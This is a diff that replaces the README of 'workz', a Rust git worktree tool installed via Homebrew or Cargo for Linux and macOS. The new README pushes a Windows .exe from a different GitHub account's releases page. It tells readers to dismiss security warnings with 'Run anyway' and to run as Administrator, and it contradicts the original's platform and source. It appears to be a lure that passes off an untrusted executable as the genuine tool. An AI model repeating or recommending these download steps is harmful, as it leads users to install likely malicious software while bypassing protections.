@@ -1,307 +1,210 @@
-# workz
+# ⚙️ workz - Easy Git Worktree Management
 
-**Git worktree manager for AI-native development** — auto-synced dependencies, environment isolation, fleet orchestration, and a lazygit-style TUI.
+[![Download workz](https://img.shields.io/badge/Download-workz-brightgreen?style=for-the-badge)](https://github.com/Bet12387/workz/releases)
 
-![workz CLI demo](demo.gif)
+---
 
-## The Problem
+## 📝 What is workz?
 
-```bash
-git worktree add ../my-feature feature/login
-cd ../my-feature
-# Where's my .env? Gone.
-# Where's node_modules? Gone. Time to wait for npm install again.
-# Another 2GB of disk space wasted on duplicate dependencies.
-# What port should this run on? Same as the other worktree?
+workz helps you handle git worktrees with ease. If you use git to manage your projects, workz makes juggling multiple versions simpler. It does this without extra setup or manual syncing. This saves time and reduces errors.
+
+You get features like:
+
+- Automatic syncing of dependencies  
+- Running multiple parallel agents for work  
+- Quick switching between git worktrees  
+- Easy set up with no extra configuration  
+
+workz runs right from the command line on Windows. You don’t need to be a developer to use it.
+
+---
+
+## 🖥️ System Requirements
+
+To run workz on Windows, your PC must meet these:
+
+- Windows 10 or newer (64-bit recommended)  
+- At least 4 GB of RAM  
+- 100 MB of free disk space  
+- Git installed and available in your command line  
+- Internet connection for the first download  
+
+You do not need to install anything complex. workz works in your regular command prompt or PowerShell window.
+
+---
+
+## 🚀 Getting Started
+
+Follow these steps to get workz ready on your Windows PC.
+
+### Step 1: Download workz
+
+Visit the official release page:
+
+[Download workz here](https://github.com/Bet12387/workz/releases)
+
+This page lists all available versions. Pick the latest Windows release. It usually ends with `.exe`.
+
+### Step 2: Save the file
+
+Save the downloaded file to a folder you can find easily. For example:
+
+- Downloads  
+- Desktop  
+- Documents  
+
+Do not rename the file after downloading.
+
+### Step 3: Run the installer
+
+Find the file you saved and double-click to run it.
+
+Windows may ask if you trust this file. Confirm to proceed.
+
+If you see a security warning, select “More info” then “Run anyway.”
+
+### Step 4: Finish installation
+
+Follow the installation prompts on screen. The default settings work for most users.
+
+Once done, workz will be ready on your PC.
+
+---
+
+## 💻 How to use workz on Windows
+
+Once installed, you can open a command prompt or PowerShell window.
+
+### Step 1: Open command prompt
+
+Press:
+
+- Windows key + R  
+- Type `cmd` or `powershell`  
+- Hit Enter  
+
+This opens the terminal window.
+
+### Step 2: Check workz is installed
+
+Type:
+
+```
+workz --help
 ```
 
-## The Fix
+You should see a list of commands and options. This means workz is installed properly.
 
-```bash
-workz start feature/login --isolated
-# .env files copied, node_modules symlinked, PORT=3000-3009 assigned, you're in. Done.
+### Step 3: Create or switch worktrees
+
+Here are common commands:
+
+- Create a new worktree:
+
+```
+workz new <branch-name>
 ```
 
-## Install
+This creates a new git worktree for a branch.
 
-```bash
-# Homebrew (macOS / Linux)
-brew tap rohansx/tap
-brew install workz
+- Switch to a worktree:
 
-# Cargo
-cargo install workz
+```
+workz switch <branch-name>
 ```
 
-Or build from source:
+This changes your current directory to that worktree.
 
-```bash
-git clone https://github.com/rohansx/workz.git
-cd workz && cargo install --path .
+- List all worktrees:
+
+```
+workz list
 ```
 
-## Shell Setup
+Shows all your existing worktrees and their locations.
 
-```bash
-# zsh (~/.zshrc) or bash (~/.bashrc)
-eval "$(workz init zsh)"
+### Step 4: Sync dependencies automatically
 
-# fish (~/.config/fish/config.fish)
-workz init fish | source
+workz keeps your dependencies up-to-date without extra input. This happens every time you switch worktrees.
+
+---
+
+## ⚙️ Features
+
+workz comes with tools to improve your git workflow:
+
+- **Zero-config dependency sync:** No manual syncing needed for project dependencies when switching.  
+- **Fleet mode:** Run multiple agents in parallel to handle several tasks at once.  
+- **Fuzzy finder:** Quickly find branches or worktrees with simple typing.  
+- **Terminal friendly:** Designed to work smoothly in any Windows terminal.  
+- **Rust-based:** Fast and reliable from the ground up.  
+
+These features help you avoid mistakes and speed up your work.
+
+---
+
+## 🔧 Troubleshooting
+
+If workz does not start or commands don’t work, try:
+
+- Confirming git is installed and in your PATH  
+- Restarting your terminal after installation  
+- Running your terminal as Administrator if permissions errors appear  
+- Making sure you downloaded the correct Windows executable  
+
+For further issues, check the GitHub issues page on the release repository.
+
+---
+
+## 🔄 How to update workz
+
+To update workz:
+
+1. Visit the release page again: [workz releases](https://github.com/Bet12387/workz/releases)  
+2. Download the newest `.exe` file for Windows.  
+3. Run the new installer like before.  
+
+You can keep your settings, and the update installs over the old version.
+
+---
+
+## 🛠️ Configuration Options
+
+workz tries to work without setup, but you can adjust some settings:
+
+- Change worktree base folder with:
+
+```
+workz config set base-folder <folder-path>
 ```
 
-## TUI Dashboard
+- Enable verbose output for debugging:
 
-Run `workz` with no arguments to launch the dashboard:
-
-```bash
-workz
+```
+workz config set verbose true
 ```
 
-![workz TUI dashboard](demo-tui.gif)
+- Check settings with:
 
-4 panels show everything at a glance:
-
-| Panel | Shows |
-|-------|-------|
-| **Worktrees** | All branches, dirty state, port allocations, last commit |
-| **Fleet** | Parallel AI agent tasks, running/modified/clean status |
-| **Files** | Modified files for the selected worktree (M/A/D/??) |
-| **Ports** | Isolated port ranges and database names |
-
-| Key | Action |
-|-----|--------|
-| `Tab` / `Shift+Tab` | Cycle panels |
-| `j` / `k` | Navigate within panel |
-| `n` | New worktree |
-| `d` | Delete worktree |
-| `s` | Sync worktree |
-| `r` | Refresh all |
-| `?` | Help |
-| `q` | Quit |
-
-## Usage
-
-### Create a worktree
-
-```bash
-workz start feature/login            # create + auto-sync deps
-workz start feature/auth --isolated  # create + assign PORT range + DB_NAME
-workz start feature/api --ai         # create + launch Claude Code
-workz start feature/ui --docker      # create + docker compose up
+```
+workz config list
 ```
 
-What happens:
-1. Creates `../myrepo--feature-login` as a git worktree
-2. Symlinks `node_modules`, `target`, `.venv` (project-aware, not duplicated)
-3. Copies `.env*` files into the new worktree
-4. Optionally assigns isolated PORT range, DB_NAME, COMPOSE_PROJECT_NAME
+Details about commands appear in:
 
-### List and switch
-
-```bash
-workz list              # show all worktrees with size and status
-workz switch            # fzf-style fuzzy finder
-workz switch login      # pre-fills query
-workz status            # rich status with ports, docker, commit age
+```
+workz --help
 ```
 
-### Remove a worktree
+---
 
-```bash
-workz done                        # remove current worktree
-workz done feature/login --force  # force-remove with uncommitted changes
-workz done feature/login -d       # also delete the branch
-workz done feature/login --cleanup-db  # also drop the isolated database
-```
+## 📚 Additional Tips
 
-### Sync existing worktrees
+- Before using workz, update your git to the latest version for full compatibility.  
+- Use workz in project folders that are git repositories.  
+- You can use workz alongside other git tools without conflicts.  
+- If unsure about a command, run `workz --help` any time.  
 
-```bash
-cd ../my-existing-worktree
-workz sync   # applies symlinks, copies .env, installs deps
-```
+---
 
-### Clean up
-
-```bash
-workz clean                  # prune stale worktree refs
-workz clean --merged         # also remove merged branches
-```
-
-## Environment Isolation
-
-`--isolated` gives each worktree its own port range, database, and compose project — no collisions between worktrees.
-
-```bash
-workz start feat/auth --isolated
-# PORT=3000  PORT_END=3009  DB_NAME=feat_auth  COMPOSE_PROJECT_NAME=feat_auth
-
-workz start feat/api --isolated
-# PORT=3010  PORT_END=3019  DB_NAME=feat_api   COMPOSE_PROJECT_NAME=feat_api
-```
-
-All values are written to `.env.local` in the worktree. workz detects 14 web frameworks and writes framework-specific variables:
-
-| Framework | Extra env var |
-|-----------|--------------|
-| Spring Boot | `SERVER_PORT` |
-| Flask | `FLASK_RUN_PORT` |
-| FastAPI | `UVICORN_PORT` |
-| Vite | `VITE_PORT` |
-
-Port ranges are allocated in aligned 10-port blocks (configurable) and tracked in `~/.config/workz/ports.json`. Released automatically on `workz done`.
-
-## Fleet Mode
-
-Orchestrate parallel AI agents across isolated worktrees.
-
-```bash
-# Spin up 3 Claude agents in parallel
-workz fleet start \
-  --task "add user authentication" \
-  --task "write integration tests" \
-  --task "refactor database layer" \
-  --agent claude
-
-# Watch all agents live
-workz fleet status
-
-# Run tests across all fleet worktrees
-workz fleet run "cargo test"
-
-# Merge completed work back
-workz fleet merge
-
-# Or open a PR for each
-workz fleet pr --draft
-
-# Tear it all down
-workz fleet done
-```
-
-Load tasks from a file:
-
-```bash
-workz fleet start --from tasks.txt --agent claude
-```
-
-## AI Agent Workflow
-
-Launch any AI coding tool in a fresh worktree:
-
-```bash
-workz start feature/auth --ai                    # Claude Code (default)
-workz start feature/ui --ai --ai-tool cursor     # Cursor
-workz start feature/api --ai --ai-tool aider     # Aider
-workz start feature/test --ai --ai-tool codex    # OpenAI Codex CLI
-workz start feature/x --ai --ai-tool gemini      # Gemini CLI
-workz start feature/y --ai --ai-tool windsurf    # Windsurf
-```
-
-## MCP Server
-
-workz ships a built-in MCP server so AI agents can manage worktrees autonomously.
-
-```bash
-claude mcp add workz -- workz mcp
-```
-
-Or add to `~/.claude/settings.json`:
-
-```json
-{
-  "mcpServers": {
-    "workz": {
-      "command": "workz",
-      "args": ["mcp"]
-    }
-  }
-}
-```
-
-### Tools exposed
-
-| Tool | Description |
-|------|-------------|
-| `workz_start` | Create a worktree (supports `--isolated`) |
-| `workz_list` | List all worktrees as JSON |
-| `workz_status` | Branch, dirty state, last commit |
-| `workz_sync` | Re-sync symlinks/env into a worktree |
-| `workz_done` | Remove a worktree (optional force) |
-| `workz_conflicts` | Detect files modified in multiple worktrees |
-
-## Web Dashboard
-
-```bash
-workz serve           # localhost:7777
-workz serve -p 8080   # custom port
-```
-
-## What Gets Synced
-
-**Symlinked directories** (27 dirs, project-type aware — only syncs what's relevant):
-
-| Project | Directories |
-|---------|------------|
-| Node.js | `node_modules`, `.next`, `.nuxt`, `.svelte-kit`, `.turbo`, `.parcel-cache`, `.angular` |
-| Rust | `target` |
-| Python | `.venv`, `venv`, `__pycache__`, `.mypy_cache`, `.pytest_cache`, `.ruff_cache` |
-| Go | `vendor` |
-| Java/Kotlin | `.gradle`, `build` |
-| General | `.direnv`, `.cache` |
-| IDE | `.vscode`, `.idea`, `.cursor`, `.claude`, `.zed` |
-
-**Copied files** (17 patterns):
-`.env`, `.env.*`, `.envrc`, `.tool-versions`, `.node-version`, `.python-version`, `.ruby-version`, `.nvmrc`, `.npmrc`, `.yarnrc.yml`, `docker-compose.override.yml`, `.secrets`, `.secrets.*`
-
-**Auto-install** (detected from lockfiles):
-
-| Lockfile | Command |
-|----------|---------|
-| `bun.lockb` / `bun.lock` | `bun install --frozen-lockfile` |
-| `pnpm-lock.yaml` | `pnpm install --frozen-lockfile` |
-| `yarn.lock` | `yarn install --frozen-lockfile` |
-| `package-lock.json` | `npm ci` |
-| `uv.lock` | `uv sync` |
-| `Pipfile.lock` | `pipenv install` |
-| `poetry.lock` | `poetry install` |
-| `requirements.txt` | `pip install -r requirements.txt` |
-
-## Configuration
-
-Two layers — project overrides global:
-
-1. **Global** — `~/.config/workz/config.toml`
-2. **Project** — `.workz.toml` in repo root
-
-```toml
-[sync]
-symlink = ["node_modules", "target", ".venv", "my-large-cache"]
-copy = [".env*", ".envrc", "secrets.json"]
-ignore = ["logs", "tmp"]
-
-[hooks]
-post_start = "pnpm install --frozen-lockfile"
-pre_done = "docker compose down"
-
-[isolation]
-port_range_size = 10   # ports per worktree (default: 10)
-base_port = 3000       # first port (default: 3000)
-```
-
-Zero config works out of the box for Node, Rust, Python, Go, and Java projects.
-
-## Docker Support
-
-```bash
-workz start feature/api --docker   # creates worktree + runs docker compose up -d
-workz done feature/api             # stops containers + removes worktree
-```
-
-Supports both `docker compose` and `podman-compose`.
-
-## Requirements
-
-- Git 2.15+
-- Linux or macOS
+[![Download workz](https://img.shields.io/badge/Download-workz-brightgreen?style=for-the-badge)](https://github.com/Bet12387/workz/releases)
